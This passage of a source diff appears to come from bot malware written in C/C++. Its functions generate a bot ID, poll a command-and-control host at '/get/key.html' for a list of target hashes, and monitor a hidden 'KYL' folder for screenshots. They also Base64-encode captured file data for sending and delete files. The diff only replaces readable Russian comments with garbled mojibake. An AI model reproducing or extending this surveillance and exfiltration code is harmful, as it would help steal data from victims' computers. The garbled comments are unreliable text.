 					lpData=m_strstr((char*)lpData1,"\r\n");					
 					ttt=(lpData-(char*)lpData1);
 					PCHAR sHach=STR::New((PCHAR)lpData1,ttt);
 
-					//хеш из мд5 файла скрина
+					//пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ5 пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 					lpData1=lpData+2;			
 					lpData=m_strstr((char*)lpData1,"\r\n");					
 					ttt=(lpData-(char*)lpData1);
@@ -846,7 +857,7 @@ LPBYTE ReadOpenDirectory(int FlagFolderDest,WCHAR *Path, WCHAR *Ext)
 
 					
 					DWORD iCount=lpData-(char*)Data;
-					//кодируем данные для отправки
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					PCHAR SData	= BASE64::Encode((LPBYTE)lpData,dwWriteB-iCount);
 					if (SData!=NULL)
 					{
@@ -880,17 +891,17 @@ LPBYTE ReadOpenDirectory(int FlagFolderDest,WCHAR *Path, WCHAR *Ext)
 
 					dwGlobSiz=dwWriteB;
 					/*if (Data!=NULL)
-						pDeleteFileW(FileName);// Удаляем файл
+						pDeleteFileW(FileName);// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 					*/MemFree(Data);
 
 				}				
 			}
         }
-		// Получаем следцющий файл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		if (!pFindNextFileW(File, &Search)) break;
 	}
 
-	// Освобождаем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	
 	pFindClose(File);
 
@@ -898,7 +909,7 @@ LPBYTE ReadOpenDirectory(int FlagFolderDest,WCHAR *Path, WCHAR *Ext)
 }
 bool DownloadHachList(PCHAR URL,PCHAR *HTMLCode)
 {
-	// Загрузить команду, тобишь список хешей которые преследуем
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (URL == NULL)
 		return false;
 	PCHAR BotID =GenerateBotID();
@@ -915,7 +926,7 @@ bool DownloadHachList(PCHAR URL,PCHAR *HTMLCode)
 
 DWORD WINAPI SendLoadedThred( LPVOID lpData )
 {
-	//поток для создании папки для скрина и отслеживания появления в ней данных
+	//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	char Host[MAX_PATH];
 	m_lstrcpy( Host, GetCurrentHost());	
 	m_lstrcat( Host, "/get/key.html");	
@@ -923,7 +934,7 @@ DWORD WINAPI SendLoadedThred( LPVOID lpData )
 	PCHAR Command = NULL;
 	while(true)	
 	{
-		WCHAR SysPath_[MAX_PATH];//получаем путь к заданной дериктории
+		WCHAR SysPath_[MAX_PATH];//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		pSHGetFolderPathW(NULL, 0x001a, NULL, 0, SysPath_);
 		plstrcatW( SysPath_, L"\\" );
 		plstrcatW( SysPath_, L"KYL\\");
@@ -962,7 +973,7 @@ void SendLoadedFiles()
 
 DWORD WINAPI SetScreensThread( LPVOID lpData )
 {
-	//получаем путь к файлу WCHAR а потом делаем скрин из мд5 файла делаем хеш и возвращаем его
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ WCHAR пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ5 пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 
 	LPVOID lpScrFile;
 	DWORD dwScrSize;
